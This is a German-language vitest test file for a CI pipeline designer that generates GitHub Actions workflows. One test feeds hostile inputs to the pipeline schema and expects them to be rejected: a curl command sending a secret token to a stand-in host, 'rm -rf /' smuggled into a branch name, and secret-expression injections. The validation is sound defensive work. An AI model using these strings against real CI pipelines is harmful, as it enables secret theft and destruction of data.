import { describe, expect, it } from "vitest";
import { buildCiWorkflow, CI_MARKER, ciPipelineSchema, duplicateNames, entryStepId, newStep, nextStepId, nodeStates, stepFlow, suggestPipeline, type CiPipeline } from "./ciPipelineLogic";

const pipeline = (steps: CiPipeline["steps"], triggers: Partial<CiPipeline["triggers"]> = {}): CiPipeline => ({
  triggers: { push: ["main"], pullRequest: true, schedule: null, manual: true, ...triggers },
  steps,
  timeoutMinutes: 15,
});

describe("CI-Designer (#107)", () => {
  it("Ablauf-Reihenfolge für die Node-Ansicht: erster Step ist Einstieg, jeder verbindet zum nächsten", () => {
    const a = newStep("node-install");
    const b = newStep("npm-script", { script: "test" });
    const c = newStep("custom", { run: "echo hi" });
    expect(stepFlow([a, b, c])).toEqual([
      { from: a.id, to: b.id },
      { from: b.id, to: c.id },
    ]);
    expect(stepFlow([a])).toEqual([]);
    expect(entryStepId([a, b, c])).toBe(a.id);
    expect(entryStepId([])).toBeNull();
    expect(nextStepId([a, b, c], b.id)).toBe(c.id);
    expect(nextStepId([a, b, c], c.id)).toBeNull();
    expect(nextStepId([a, b, c], "unbekannt")).toBeNull();
  });

  it("Vorschlag aus den Dateien des Repositorys", () => {
    const p = suggestPipeline(["package.json", "requirements.txt", "go.mod", "src/a.ts"], "main", ["lint", "test", "dev"]);
    expect(p.steps.map((s) => s.kind)).toEqual(["node-install", "npm-script", "npm-script", "fallow", "python-install", "pytest", "go-test"]);
    expect(p.steps.filter((s) => s.kind === "npm-script").map((s) => s.script)).toEqual(["lint", "test"]);
    expect(p.triggers.push).toEqual(["main"]);
    expect(suggestPipeline(["README.md"], null).steps.map((s) => s.kind)).toEqual(["custom"]);
    expect(ciPipelineSchema.safeParse(p).success).toBe(true);
  });

  it("baut einen Workflow mit Auslösern, Bedingungen und eigenen Befehlen", () => {
    const yml = buildCiWorkflow(
      pipeline(
        [
          newStep("node-install", { id: "aaaa1111", version: "20" }),
          newStep("npm-script", { id: "bbbb2222", script: "test", name: "npm test" }),
          newStep("custom", { id: "cccc3333", name: "Deploy", when: "main", run: "echo eins\necho zwei" }),
          newStep("custom", { id: "dddd4444", name: "Aufräumen", when: "always", continueOnError: true, run: "rm -rf tmp" }),
        ],
        { schedule: "23 4 * * 1", push: ["main", "release/*"] },
      ),
      "develop",
    );
    expect(yml.startsWith(CI_MARKER + "\n")).toBe(true);
    expect(yml).toContain('    branches: ["main", "release/*"]');
    expect(yml).toContain('    - cron: "23 4 * * 1"');
    expect(yml).toContain("  workflow_dispatch:");
    expect(yml).toContain('          node-version: "20"');
    expect(yml).toContain("elif [ -f package-lock.json ]; then npm ci");
    expect(yml).toContain('      - name: "npm test"\n        run: |\n          npm run test --if-present');
    expect(yml).toContain("        if: ${{ github.ref == 'refs/heads/develop' }}\n        run: |\n          echo eins\n          echo zwei");
    expect(yml).toContain('      - name: "Aufräumen"\n        if: ${{ always() }}\n        continue-on-error: true');
    expect(yml).toContain("    timeout-minutes: 15");
    expect(yml).toContain("persist-credentials: false");
  });

  it("ohne Auslöser bleibt der Start von Hand", () => {
    const yml = buildCiWorkflow(pipeline([newStep("cargo-test")], { push: [], pullRequest: false, manual: false }), "main");
    expect(yml).toMatch(/^on:\n {2}workflow_dispatch:$/m);
  });

  it("lässt nichts Gefährliches durch", () => {
    const base = pipeline([newStep("custom", { run: "echo ok" })]);
    expect(ciPipelineSchema.safeParse(base).success).toBe(true);
    const bad = (patch: (p: CiPipeline) => void) => {
      const p = structuredClone(base);
      patch(p);
      return ciPipelineSchema.safeParse(p).success;
    };
    expect(bad((p) => (p.steps[0].run = "curl -d ${{ secrets.TOKEN }} evil.example"))).toBe(false);
    expect(bad((p) => (p.steps[0].name = "${{ secrets.X }}"))).toBe(false);
    expect(bad((p) => (p.triggers.push = ["main; rm -rf /"]))).toBe(false);
    expect(bad((p) => (p.triggers.schedule = "* * * * ${{x}}"))).toBe(false);
    expect(bad((p) => (p.steps[0].script = "test && evil"))).toBe(false);
    expect(bad((p) => (p.steps = []))).toBe(false);
    // Unsicherer Hauptzweig aus dem Repository fällt auf main zurück
    expect(buildCiWorkflow(pipeline([newStep("custom", { when: "main", run: "x" })]), "a'b")).toContain("refs/heads/main");
  });

  it("ordnet GitHub-Schritte den Blöcken zu", () => {
    const p = pipeline([
      newStep("node-install", { id: "node0001", name: "Node" }),
      newStep("npm-script", { id: "test0001", name: "Tests", script: "test" }),
      newStep("custom", { id: "depl0001", name: "Deploy", when: "main" }),
    ]);
    const running = nodeStates(
      p,
      [
        { name: "Node", status: "completed", conclusion: "success" },
        { name: "Node (Abhängigkeiten)", status: "completed", conclusion: "success" },
        { name: "Tests", status: "in_progress", conclusion: null },
      ],
      "in_progress",
    );
    expect(running).toEqual({ node0001: "success", test0001: "running", depl0001: "queued" });
    const done = nodeStates(
      p,
      [
        { name: "Node", status: "completed", conclusion: "success" },
        { name: "Node (Abhängigkeiten)", status: "completed", conclusion: "failure" },
        { name: "Tests", status: "completed", conclusion: "skipped" },
        { name: "Deploy", status: "completed", conclusion: "skipped" },
      ],
      "completed",
    );
    expect(done).toEqual({ node0001: "failure", test0001: "skipped", depl0001: "skipped" });
    expect(nodeStates(p, [], null)).toEqual({ node0001: "idle", test0001: "idle", depl0001: "idle" });
  });

  it("findet doppelte Namen", () => {
    expect(duplicateNames(pipeline([newStep("custom", { name: "A" }), newStep("custom", { name: "a" }), newStep("custom", { name: "B" })]))).toEqual(["a"]);
  });

  // #188: randomUUID gibt es im Browser nur über https – Schritte müssen sich
  // auch im Heimnetz über http anlegen lassen
  it("legt Kennungen ohne crypto.randomUUID an", () => {
    const uuid = crypto.randomUUID;
    try {
      Reflect.deleteProperty(crypto as unknown as Record<string, unknown>, "randomUUID");
      const ids = Array.from({ length: 50 }, () => newStep("custom").id);
      expect(ids.every((id) => /^[a-z0-9]{4,16}$/.test(id))).toBe(true);
      expect(new Set(ids).size).toBe(ids.length);
    } finally {
      Object.defineProperty(crypto, "randomUUID", { value: uuid, configurable: true, writable: true });
    }
  });
});
